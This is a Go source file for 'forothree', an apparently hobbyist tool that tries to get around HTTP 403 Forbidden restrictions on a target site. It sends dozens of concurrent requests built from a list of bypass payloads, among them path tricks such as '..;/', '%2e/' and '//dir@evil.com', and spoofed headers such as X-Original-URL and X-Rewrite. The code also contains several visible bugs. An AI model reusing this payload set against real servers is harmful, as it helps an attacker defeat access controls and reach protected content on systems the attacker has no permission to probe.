package main

import "fmt"
import "github.com/valyala/fasthttp"
import "time"
import "strconv"
import "os"
import "bufio"
import "net/url"
import "strings"
import "sync"
import "flag"
import "io/ioutil"
import "unicode"
import "regexp"


//forothree v.0.1
//created by hanhanhan


type rawconf struct {
	Url string
	Urlf string
	Bodylen bool
	Scode []string
	Outname string
	Outfile *(os.File)
	Timeout int
	Method string
	Headers []string
	Retnum int
	Headby bool
	Rec bool
	Xheaders bool
	Location bool
}

func firstchartoasciicode(s string) (string) {
	rest := fmt.Sprintf(s[1:])
	tem := []rune(s)
	temp := tem[0]
	temp2 := int(temp)
	first := strconv.Itoa(temp2)
	return fmt.Sprintf("%s%s%s","%",first,rest)
}

func Find(slice []string, val string) (int, bool) { //check if value exist in slice
    for i, item := range slice {
        if item == val {
            return i, true
        }
    }
    return -1, false
}

func headtorequest(r rawconf,dir string, h string,wg sync.WaitGroup) {
	headers := r.Headers
	headers = append(headers,h)
	myrequest(r,dir,"","",&wg)
}

func storehere(d string, f *(os.File) ) { //store result (in string) to file
	if _, err := f.WriteString(d); err != nil {
		fmt.Printf("[-]storing function error :  ")
		panic(err)
	}
	
}

func strtoreversecase(s string) (string) { //change an alphabet to upper (if lower), or to lower (if upper), return none if no alphabet found
	if s == "" {
		return ""
	}
	slic := strings.Split(s,"")
	
	for i := 0; i < len(slic)-1; i++ {        		
		//slic := strings.Split(s,"")
		run := []rune(slic[i])
	

		if unicode.IsUpper(run[0]) {
			
			str := string(run[0])
			str = strings.ToLower(str)
			slic[i] = str
			res := strings.Join(slic,"")
			
			return res
		} else if unicode.IsLower(run[0]) {
			
			str := string(run[0])
			str = strings.ToUpper(str)
			slic[i] = str
			res := strings.Join(slic,"")
			
			return res
		} else {
			continue	
		}


	}
	return ""
}


func strtoaciicode(s string, n int) (string) { //change a char number n in string to ascicode
	slic := strings.Split(s,"")
	run := []rune(slic[n])
	int := fmt.Sprintf("%%"+"%d",run) 
	slic[n] = string(int)
	res := strings.Join(slic,"")
	res = strings.Replace(res,"]","",1)
	res = strings.Replace(res,"[","",1)
	return res
}


func parseHeaders (v string) (string,string) { //parse header in stdin
	htemp := strings.SplitAfterN(v,":",2)
	//temp := htemp[0]
	htemp[0] = strings.Replace(htemp[0],":","",1)
	return htemp[0],htemp[1]
	//req.Header.Add(temp, htemp[1])
}

func parseurldir (urlz string) (string,string) { //parse url with single directory
	unparse,err := url.QueryUnescape(urlz)
	u,err := url.Parse(unparse)
	
	var dir,domain = "",""


	if err != nil {
		fmt.Println("[-]error, something wrong when parsing the url : %s",err)
	}
	
	if u.Scheme == "" { //parsing when no http schema
		u.Scheme = "https" 
		x := strings.SplitAfterN(urlz,"/",2)
		u.Host = x[0]
		dir = x[1]
		
		domain = u.Scheme + "://" + u.Host
		
	} else { //parsing when there's http schema
		
		dir = strings.Replace(u.Path,"/","",1)	
		domain = u.Scheme + "://" + u.Host + "/"
	}



	return domain,dir
}

func parseurldirs (urlz string) (string,[]string) { //parse url with subdirectory
	unparse,err := url.QueryUnescape(urlz)
	u,err := url.Parse(unparse)
	
	var temp,domain = "",""

	if err != nil {
		fmt.Println("[-]error, something wrong when parsing the url in directory: %s",err)
	}
	
	if u.Scheme == "" { //parsing when no http schema
		u.Scheme = "https" 
		x := strings.SplitAfterN(urlz,"/",2)
		u.Host = x[0]
		temp = x[1]
		domain = u.Scheme + "://" + u.Host
	
	} else { //parsing when there's http schema
		domain = u.Scheme + "://" + u.Host + "/"
		temp = strings.Replace(u.Path,"/","",1)
	}

	
	dir := strings.Split(temp,"/")
	
	if dir[len(dir)-1] == "" {
		dir = dir[:len(dir)-1]	
	}
	

	return domain, dir
}


func myrequest(r rawconf, dir string, before string, after string, wg *sync.WaitGroup) { //request engine

	//prepare url
	url := ""
	if before != "DOMAINMOD" {

		url = r.Url+before+dir+after
	} else {
		r.Url = r.Url[:len(r.Url)-1]
		url = r.Url + after + "/" + dir
	}
	
	wg.Add(1)

	//prepare request
	req := fasthttp.AcquireRequest()
	resp := fasthttp.AcquireResponse()
	defer func() {
		fasthttp.ReleaseResponse(resp)
		fasthttp.ReleaseRequest(req)
	}()
	
	//set URL
	req.SetRequestURI(url)

	//add header
	if len(r.Headers) > 0 {
		for _,v := range r.Headers {
			i,j := parseHeaders(v)
			req.Header.Add(i, j)
		}
	}	

	// define web client request Method
	req.Header.SetMethod(r.Method)
	
	//set request timeout
	var tout = time.Duration(r.Timeout) * time.Second
	
	//do request, break if not timeout, still 
	for true {
		var err = fasthttp.DoTimeout(req, resp, tout)
		

		//print error, code still redundant/inefficient
		if err != nil {
			
			if err.Error() == "timeout" {
				fmt.Printf("domain : %s |error : %s%s",url,err,"\n")
				r.Retnum--
				if r.Retnum == 0 {
					break
				}
			}
		} else {
			break
		}
	}

	//print output
	domaino := fmt.Sprintf("domain : %s |",url)
	codeo := fmt.Sprintf("code : " + strconv.Itoa(resp.StatusCode()) + " |") //no filter status code yet
	re := regexp.MustCompile("[0-9]+")
	codeocheck := strings.Join(re.FindAllString(codeo,-1),"") //to get raw number of status code, used to determine whether to print it 
	

	lengtho := ""
	locationo := ""
	xheaderso := ""
	
	if r.Bodylen {
		t := resp.String()
		lengtho = fmt.Sprintf("length : %v |",len(t)) //no filter length yet
	}
	
	if r.Xheaders {
		xheaderso = fmt.Sprintf("xtra-header : %v |",r.Headers[len(r.Headers)-1])
	}

	if r.Location {
		a := resp.Header
		b := string(a.Peek("Location"))
		if b != "" {
			locationo = fmt.Sprintf("location : %v |",)	
		}
	}
	
	_, found := Find(r.Scode,codeocheck) //statuscode filter
	
	if found{
		fmt.Println(domaino + codeo + lengtho + locationo + xheaderso)
	}

	if r.Outname != ""{
		if found{
			storehere(domaino + codeo + lengtho + xheaderso + "\n",r.Outfile)	
		}
	}
	
	wg.Done()
}


func payloads(r rawconf, dir string) {
 	var wg sync.WaitGroup
	myrequest(r,dir,"","",&wg)
	defer func(){
		
		wg.Wait()
		
	}()
	
	
	//23 goroutine total
	go myrequest(r,dir,"DOMAINMOD",".",&wg)
	go myrequest(r,dir,"","%2500",&wg)
	go myrequest(r,dir,"","%20",&wg)
	go myrequest(r,dir,"%2" + "e/","",&wg) 
	go myrequest(r,dir,"","%09",&wg)
	go myrequest(r,dir,"","/..;/",&wg)
	go myrequest(r,dir,"","..;/",&wg) 
	go myrequest(r,dir,".;/","",&wg)
	go myrequest(r,dir,"..;/","",&wg) 
	go myrequest(r,dir,"","/.",&wg)
	go myrequest(r,dir,"","//",&wg)
	go myrequest(r,dir,"./","/./",&wg)
	go myrequest(r,dir,"/","",&wg) 
	go myrequest(r,dir,"","//dir@evil.com",&wg)
	go myrequest(r,dir,"","//google.com",&wg)
	go myrequest(r,dir,"",".json",&wg)
	go myrequest(r,dir,"","?",&wg)
	go myrequest(r,dir,"\\..\\.\\","",&wg)
	go myrequest(r,dir,"","??",&wg)
	go myrequest(r,dir,"","#",&wg)
	go myrequest(r,dir,".;","",&wg)
	go myrequest(r,dir,"","/~",&wg)
	go myrequest(r,dir,"./","",&wg)
	go myrequest(r,firstchartoasciicode(dir),"","",&wg)
	
	if strtoreversecase(dir) != "" {
		
		go myrequest(r,strtoreversecase(dir),"","",&wg)									
	}
	

	
}

func payloads2(r rawconf, dir string) {

	var wg sync.WaitGroup
 	
	myrequest(r,dir,"","",&wg)
	
	defer func(){
		
		wg.Wait()
		
	}()
	
	
	go myrequest(r,dir,"DOMAINMOD",".",&wg)
	go myrequest(r,dir,"%2" + "e/","",&wg) //LOOP?
	go myrequest(r,dir,"","..;/",&wg) // LOOP?
	go myrequest(r,dir,"..;/","",&wg) //and ../ LOOP? 
	go myrequest(r,dir,"/","",&wg) // / LOOP?
	go myrequest(r,dir,"","/~",&wg) 
	go myrequest(r,dir,"./","",&wg)
	go myrequest(r,firstchartoasciicode(dir),"","",&wg)
}

func payloads3(r rawconf, dir string) { 
	
	r.Xheaders = true
	var wg sync.WaitGroup
 	
	defer func(){
		//wg.Done()
		wg.Wait()
		
	}()

	g,_ := os.Open("headerbypass.txt") // iterate file lineByLine                                                     
    g2 := bufio.NewScanner(g)
    
    
    var lol []string
    
    for g2.Scan() {  

    	var line = g2.Text()
    	lol = append(lol,line)
    	
    }


    for i := 0; i < len(lol); i++ {
    	
    	go func(i int) {
    		//defer wg.Done()
    		r.Headers = append(r.Headers,lol[i])
			myrequest(r,dir,"","",&wg)
			if len(r.Headers) != 0 { //magic if to debug goroutine panic: runtime error: slice bounds out of range [:-1]
				r.Headers = r.Headers[:len(r.Headers)-1]		
			}
    	}(i)    	
    }
    
    go func() {
		r.Headers = append(r.Headers,"X-Rewrite:/"+dir)
		myrequest(r,"","","",&wg) //LOOP?
		if len(r.Headers) != 0 { //magic if to debug goroutine panic: runtime error: slice bounds out of range [:-1]
			r.Headers = r.Headers[:len(r.Headers)-1]	
		}
	}()

	r.Headers = append(r.Headers,"X-Original-URL:/"+dir)	
	myrequest(r,"sabeb","","",&wg)
	if len(r.Headers) != 0 { //magic if to debug goroutine panic: runtime error: slice bounds out of range [:-1]
		r.Headers = r.Headers[:len(r.Headers)-1]
	}

}

func main() {

    var r = rawconf{}

    flag.BoolVar(&(r.Bodylen),"l",false," show response length")
    
    //code still redundant/inefficient
    t1 := flag.String("s","200,404,403,301,404","-s specify status code, ex 200,404")
    
    
    //code still redundant/inefficient
    t2 := flag.String("e","Connection:close"," set custom headers, ex head1:myhead,head2:yourhead")
    
    
    flag.IntVar(&(r.Timeout),"t",3," specify request timeout in seconds")
    flag.StringVar(&(r.Method),"m","GET"," set request method")
    flag.IntVar(&(r.Retnum),"r",2," set max number of retries")
    flag.StringVar(&(r.Url),"u",""," url target")
    flag.StringVar(&(r.Urlf),"ul",""," url list target")
    flag.StringVar(&(r.Outname),"o",""," specify output file name")
    flag.BoolVar(&(r.Headby),"b",false," disable header bypass")
    flag.BoolVar(&(r.Location),"hl",false," show header location")
    flag.BoolVar(&(r.Rec),"c",false," disable recursive bypass")
    r.Xheaders = false
    flag.Parse()
    
    
    r.Scode = strings.Split(*t1,",")
    r.Headers = strings.Split(*t2,",")

    //create file if -o enabled
    if r.Outname != "" {
	    f,err := os.OpenFile(r.Outname,os.O_APPEND|os.O_WRONLY|os.O_CREATE,0644)
	    if err != nil {
	    	fmt.Printf("[-]create file error : ")
	    	panic(err)
	    	}
	    r.Outfile = f

    }
    
    
    var g *os.File
    var g2 *bufio.Scanner
    tfile := "/tmp/l8nwe9vnjeiohfn9fnme"  //file for temp

    //close file if -o enabled
    defer func() {
    	if r.Outname != "" {
    		r.Outfile.Close()
    		os.Remove(tfile)
    	}
    }()

    //-u and -ul logic
    if r.Url != "" && r.Urlf != "" {
		fmt.Println("[-] use either -u or -ul")
		os.Exit(3)
    } else if r.Urlf != "" {
    	g,_ = os.Open(r.Urlf) // iterate file lineByLine                                                     
	    g2 = bufio.NewScanner(g)                                                                                    
	    
    } else if r.Url != "" {
    	d1 := []byte(r.Url)
	    
	    err := ioutil.WriteFile(tfile, d1, 0644) //need to change to random name
	    if err != nil {
			fmt.Println("[-]cannot create temp file")
			panic(err)
		}
	    
	    g,err = os.Open(tfile) // iterate file lineByLine                                                     
	    if err != nil {
			fmt.Println("[-]cannot open temp file")
			panic(err)
		}

	    g2 = bufio.NewScanner(g)                                                                                    
    } else {
    	fmt.Println("[-] No target found")
    	os.Exit(3)
    }


    for g2.Scan() {                                                                                              
        var line = g2.Text()	
        


        domain,dirs := parseurldirs(line)
        
        //if based on number of directory
        if len(dirs) > 1 {
        	
        	last := dirs[len(dirs)-1]
        	
        	dirstemp := dirs[0:len(dirs)-1]
        	middle := strings.Join(dirstemp, "/")
        	
        	r.Url = domain  + middle + "/"
        	payloads(r,last)
        	
        	if !(r.Rec) {
	        	for i := 0; i < len(dirs)-1; i++ {   // -1 for keeptesting all level of directory excluding file destination      		
	        		
	        		middle = strings.Join(dirs[0:i], "/")
	        		last = strings.Join(dirs[i:len(dirs)], "/") //?
	        		if middle == "" { //for debug when https://dodol.com//dir/subdir happen
	        			r.Url = domain  + middle
	        			
	        		} else {
	        			r.Url = domain  + middle + "/"	
	        		}
	        		payloads2(r,last)
	        	}
        	}

      		if !(r.Headby) {

				//r.Url = r.Url[0:len(r.Url)-1]
      			payloads3(r,last)
      		}

        } else {
        	
        	domain,dir := parseurldir(line)
			
        	r.Url = domain
        	
        	payloads(r,dir)
        	
        	if !(r.Headby) {
        		payloads3(r,dir)	
        	}
        	
        }

                         
	}



	
}
